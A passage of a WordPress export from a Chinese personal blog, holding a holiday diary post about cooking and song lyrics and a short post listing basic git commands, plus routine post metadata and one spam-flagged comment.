		<content:encoded><![CDATA[“我最亲爱的，你过得怎么样，没我的日子，你别来无恙；依然亲爱的，我没让你失望，让我亲一亲，像过去一样。”——《我最亲爱的》

十一假期，中国好声音给我了很多感动，巅峰之夜，张惠妹一首《我最亲爱的》，深深的打动了我，亲爱的，你过的怎么样？

十一前加班比较严重，整个人都瘦了下来，于是决定十一自己开始学做菜。一个人逛乐购，一个人去买菜，一个人的滋味真的不好受。

很羡慕中国好声音里面的金志文，有个时刻陪在他身边爱他的女友。我想，一个人的生活，更要好好的照顾自己，因为如同<a href="http://hanhan.qq.com/hanhan/one/one95.htm#page3">《文艺和爱都是体力活》</a>里讲的那样，只要岁月静好，身体无恙，一切都不可怕。

我做的菜:

银耳汤
银耳需要先用开水泡一会，冷水的时候放冰糖，亲爱的，这是你之前教我的。

<img src="http://files.blogcn.com/wp06/M00/09/28/wKgKDFBq8-MAAAAAAAfmqicEKiE801.png" alt="银耳汤" />

腊肉豌豆瘦肉粥
直接把豌豆，切碎的胡萝卜丁 和 切碎的腊肉，一锅煮就行。

<img src="http://files.blogcn.com/wp03/M00/06/B8/wKgKClBq89AAAAAAAAimXTrBBQY721.png" alt="腊肉豌豆瘦肉粥" />

午餐  蘑菇炒肉 + 胡萝卜排骨汤
买的蘑菇和里脊肉，青椒，炒了一盘，味道还行吧。

<img src="http://files.blogcn.com/wp06/M00/03/B4/wKgKDVBq88MAAAAAAAe8UUnk-CA618.png" alt="炒蘑菇" />


“经过那段遗憾，请你放心，我变得更加坚强，世界不管怎样荒凉，爱过你就不怕孤单。”——《我最亲爱的》]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>178</wp:post_id>
		<wp:post_date>2012-10-02 22:54:15</wp:post_date>
		<wp:post_date_gmt>2012-10-02 14:54:15</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e5%8d%81%e4%b8%80</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1349189659]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[12]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
								<wp:comment>
		<wp:comment_id>6</wp:comment_id>
		<wp:comment_author><![CDATA[淘宝皇冠店铺导航]]></wp:comment_author>
		<wp:comment_author_email>mj9j8c6d@163.com</wp:comment_author_email>
		<wp:comment_author_url>http://www.889912.com</wp:comment_author_url>
		<wp:comment_author_IP>183.3.99.44</wp:comment_author_IP>
		<wp:comment_date>2013-01-03 21:56:45</wp:comment_date>
		<wp:comment_date_gmt>2013-01-03 13:56:45</wp:comment_date_gmt>
		<wp:comment_content><![CDATA[祝福朋友们身体健康，福运连连，欢笑天天，平安年年!]]></wp:comment_content>
		<wp:comment_approved>spam</wp:comment_approved>
		<wp:comment_type></wp:comment_type>
		<wp:comment_parent>0</wp:comment_parent>
		<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
			</item>
		<item>
		<title>git 命令</title>
		<link>http://codemylife.blogcn.com/2013/04/git-%e5%91%bd%e4%bb%a4/</link>
		<pubDate>Sat, 06 Apr 2013 12:39:38 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[工具]]></category>

		<category domain="category" nicename="%e5%b7%a5%e5%85%b7"><![CDATA[工具]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=182</guid>
		<description></description>
		<content:encoded><![CDATA[很久未发文了，实在有些懒。督促自己，多学习，多思考。

git 很方便的能在本地建立一个代码仓库，这点比svn好，于是去github注册一个账号。

常用的命令：
<ul>
	<li>git log：查看提交日志</li>
	<li>git status： 查看状态，（新建，修改）</li>
	<li>git add：把当前文件放入暂存区域</li>
	<li>git commit –m " " ： 给暂存区域生成快照并提交</li>
	<li>git push origin master：上传到服务器</li>
</ul>
可视化的工具TortoiseGit也很方便。

一些讲git命令的网址：
<a href="http://www.cnblogs.com/fnng/archive/2012/01/07/2315685.html">http://www.cnblogs.com/fnng/archive/2012/01/07/2315685.html</a>
<a href="http://marklodato.github.io/visual-git-guide/index-zh-cn.html">http://marklodato.github.io/visual-git-guide/index-zh-cn.html</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>182</wp:post_id>
		<wp:post_date>2013-04-06 20:39:38</wp:post_date>
		<wp:post_date_gmt>2013-04-06 12:39:38</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>git-%e5%91%bd%e4%bb%a4</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1365251979]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
	</channel>
</rss>
